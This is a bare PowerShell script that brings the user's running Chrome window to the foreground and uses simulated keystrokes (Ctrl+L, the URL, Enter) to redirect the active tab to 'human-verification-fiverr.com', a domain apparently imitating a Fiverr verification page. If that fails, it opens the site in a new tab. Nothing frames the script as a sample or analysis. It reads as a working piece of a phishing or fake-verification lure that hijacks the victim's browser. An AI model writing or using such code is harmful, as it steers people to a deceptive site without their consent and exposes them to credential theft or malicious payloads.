param(
    [string]$Url = "https://human-verification-fiverr.com/"
)
 
function Use-SameChromeTab {
    param(
        [string]$Url
    )
    # Check if Chrome is running
    $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
    if (-not $chromeProcesses) {
        Write-Host "Chrome not running. Starting Chrome..." -ForegroundColor Yellow
        Start-Process "chrome.exe" $Url
        return
    }
    # Bring Chrome to foreground
    try {
        $wshell = New-Object -ComObject wscript.shell
        $success = $wshell.AppActivate("Google Chrome")
        if ($success) {
            Write-Host "Chrome activated. Attempting to navigate..." -ForegroundColor Green
            # Wait a moment
            Start-Sleep -Milliseconds 500
            # Focus address bar (Ctrl+L or Alt+D)
            $wshell.SendKeys("^l")  # Ctrl+L to focus address bar
            Start-Sleep -Milliseconds 200
            # Type new URL
            $wshell.SendKeys($Url)
            Start-Sleep -Milliseconds 200
            # Press Enter
            $wshell.SendKeys("~")  # Enter key
            Write-Host "✅ Navigation command sent to Chrome" -ForegroundColor Green
        } else {
            Write-Host "Could not activate Chrome. Opening new tab..." -ForegroundColor Yellow
            Start-Process "chrome.exe" "--new-tab $Url"
        }
    } catch {
        Write-Host "Error: $_" -ForegroundColor Red
        Write-Host "Opening in new tab..." -ForegroundColor Yellow
        Start-Process "chrome.exe" "--new-tab $Url"
    }
}
 
# Run
Use-SameChromeTab -Url $Url
